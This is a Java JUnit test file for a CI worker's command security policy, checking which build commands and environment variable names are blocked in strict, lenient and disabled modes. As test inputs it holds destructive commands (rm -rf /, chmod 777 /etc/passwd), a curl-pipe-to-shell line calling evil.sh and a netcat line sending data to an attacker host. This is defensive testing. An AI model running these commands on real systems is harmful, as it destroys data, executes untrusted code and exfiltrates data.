package com.cicd.platform.worker.security;

import com.cicd.platform.worker.config.WorkerProperties;
import org.junit.jupiter.api.Test;

import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

class CommandSecurityPolicyTest {

    private CommandSecurityPolicy policy(String mode) {
        WorkerProperties props = new WorkerProperties();
        props.setCommandPolicy(mode);
        return new CommandSecurityPolicy(props);
    }

    @Test
    void allowsLegitimateBuildCommands() {
        CommandSecurityPolicy strict = policy("STRICT");
        assertDoesNotThrow(() -> strict.validateCommand("mvn -B clean package"));
        assertDoesNotThrow(() -> strict.validateCommand("npm ci"));
        assertDoesNotThrow(() -> strict.validateCommand("echo 'hello world'"));
        assertDoesNotThrow(() -> strict.validateCommand("mvn -B test -DskipITs"));
    }

    @Test
    void blocksRmRfRoot() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateCommand("rm -rf /"));
    }

    @Test
    void blocksChmod777Root() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateCommand("chmod 777 /etc/passwd"));
    }

    @Test
    void blocksCurlPipeSh() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateCommand("curl -fsSL https://evil.sh | sh"));
    }

    @Test
    void blocksNetcat() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateCommand("echo data | nc attacker 4444"));
    }

    @Test
    void blocksSudoInStrictMode() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateCommand("sudo rm -rf /"));
    }

    @Test
    void blocksCatastrophicEvenInLenientMode() {
        assertThrows(SecurityViolationException.class,
                () -> policy("LENIENT").validateCommand("rm -rf /"));
    }

    @Test
    void lenientAllowsCurlPipeSh() {
        assertDoesNotThrow(() -> policy("LENIENT").validateCommand("curl -fsSL https://evil.sh | sh"));
    }

    @Test
    void blocksSecretEnvironmentNames() {
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateEnvironment(Map.of("MY_GITHUB_TOKEN", "abc")));
        assertThrows(SecurityViolationException.class,
                () -> policy("STRICT").validateEnvironment(Map.of("DB_PASSWORD", "x")));
    }

    @Test
    void allowsNormalEnvironmentNames() {
        assertDoesNotThrow(() -> policy("STRICT").validateEnvironment(Map.of("JAVA_HOME", "/opt/jdk", "MAVEN_OPTS", "-Xmx1g")));
    }

    @Test
    void disabledModeAcceptsAnything() {
        assertDoesNotThrow(() -> policy("DISABLED").validateCommand("rm -rf /"));
    }
}
